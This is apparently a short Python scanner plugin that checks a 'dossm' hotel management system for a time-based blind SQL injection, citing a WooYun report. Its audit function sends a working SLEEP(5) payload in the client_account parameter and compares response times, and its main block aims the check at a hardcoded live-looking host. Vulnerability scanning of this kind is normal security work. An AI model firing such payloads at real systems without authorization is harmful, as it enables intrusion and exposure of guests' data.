#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 123
#_PlugName_ = dossm的某处sql注入可导致酒店数据泄露
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2014-080156
import re,time
def assign(service, arg):
    if service == 'dossm':
        return True, arg
def audit(arg):
    # 获取页面访问时间
    start_t1     = time.time()
    code1, head, res, errcode, _ = curl.curl2(arg+'saas/Guest/getLogin/?jsoncallback=jQuery191031815274455584586_1413791294237&client_account=wzs_ytyl*&code=&language=zh-cn&referer=&fields=1&_=1413791294238')
    end_t1       = time.time()
    body_time    = end_t1 - start_t1 #页面执行时间
    # 获取执行Payload执行时间
    payload      = "saas/Guest/getLogin/?jsoncallback=jQuery180009386292030103505_1413793315607&referer=&dossm-id=2014102016215825117&client_account=hn_hy'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))kGZx)%20AND%20'VpIC'='VpIC&language=zh-cn&referer=&fields=1&_=1413791294238"
    target       = arg + payload
    start_t2     = time.time()
    code2, head, res, errcode, _ = curl.curl2(target)
    end_t2       = time.time()
    payload_time = end_t2 - start_t2 #带payload的页面执行时间
    if code1==200 and code2==200 and body_time<5<payload_time: #确保正常访问不会超过5S且payload之后超过5S
        security_note(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('dossm', 'http://www.hebs.asia:80/')[1])